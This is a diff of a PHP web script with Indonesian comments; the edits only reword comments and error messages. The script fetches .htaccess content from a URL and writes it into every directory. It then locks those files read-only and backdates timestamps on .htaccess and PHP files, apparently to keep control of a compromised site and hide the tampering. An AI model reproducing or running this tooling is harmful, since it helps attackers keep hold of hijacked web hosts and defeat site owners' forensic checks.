@@ -7,7 +7,7 @@ $success = [];
 $error = [];
 
 // ===================================================================
-// LANGKAH 1: DEFINISIKAN SEMUA FUNGSI DI SINI (GLOBAL SCOPE)
+// SEMUA FUNGSI DIDEFINISIKAN DI SINI (GLOBAL SCOPE)
 // ===================================================================
 
 function fetchFileFromUrl($url) {
@@ -35,7 +35,7 @@ function setFolders0755($dir, &$success, &$error) {
             if (@chmod($path, 0755)) {
                 $success[] = "✅ Folder chmod 0755: $path";
             } else {
-                $error[] = "❌ Gagal chmod folder: $path (mungkin permission denied)";
+                $error[] = "❌ Gagal chmod folder: $path";
             }
             setFolders0755($path, $success, $error);
         }
@@ -76,7 +76,7 @@ function unlockHtaccessFiles($dir, &$success, &$error) {
             if (@chmod($path, 0644)) {
                 $success[] = "✅ Unlock .htaccess: $path";
             } else {
-                $error[] = "❌ Gagal unlock .htaccess: $path (mungkin file tidak dimiliki user ini)";
+                $error[] = "❌ Gagal unlock .htaccess: $path";
             }
         }
     }
@@ -93,13 +93,12 @@ function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) 
 
         if (is_dir($path)) {
             $htaccessPath = $path . '/.htaccess';
-
             if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
                 @chmod($htaccessPath, 0644);
             }
             
             if (@file_put_contents($htaccessPath, $content) === false) {
-                $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
+                $error[] = "❌ Gagal deploy ke: $htaccessPath";
             } else {
                 $success[] = "✅ Deployed .htaccess: $htaccessPath";
                 if (@chmod($htaccessPath, 0444)) {
@@ -107,7 +106,6 @@ function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) 
                 } else {
                     $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
                 }
-
                 if ($timestamp && @touch($htaccessPath, $timestamp)) {
                     $success[] = "⏱️ Timestamp set untuk $htaccessPath";
                 } elseif ($timestamp) {
@@ -115,7 +113,6 @@ function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) 
                 }
             }
             deployHtaccess($path, $content, $success, $error, $timestamp);
-            
         } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
             if (@touch($path, $timestamp)) {
                 $success[] = "⏱️ Timestamp set untuk PHP: $path";
@@ -127,7 +124,7 @@ function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) 
 }
 
 // ===================================================================
-// LANGKAH 2: PROSES LOGIKA HANYA SAAT REQUEST METHOD ADALAH POST
+// LOGIKA UTAMA HANYA BERJALAN SAAT REQUEST ADALAH POST
 // ===================================================================
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -142,7 +139,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!$htaccessContent) {
             $error[] = "❌ Gagal ambil isi .htaccess dari URL.";
         } else {
-            // PANGGIL SEMUA FUNGSI DI DALAM BLOK INI
+            // FUNGSI DIPANGGIL DI SINI, SETELAH SEMUA VALIDASI LOLOS
             $success[] = "--- 🔧 LANGKAH AWAL: Set Permission Folder & File ---";
             setFolders0755($targetPath, $success, $error);
             setFiles0644($targetPath, $success, $error);
@@ -154,7 +151,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 ?>
-
 <!DOCTYPE html>
 <html>
 <head>
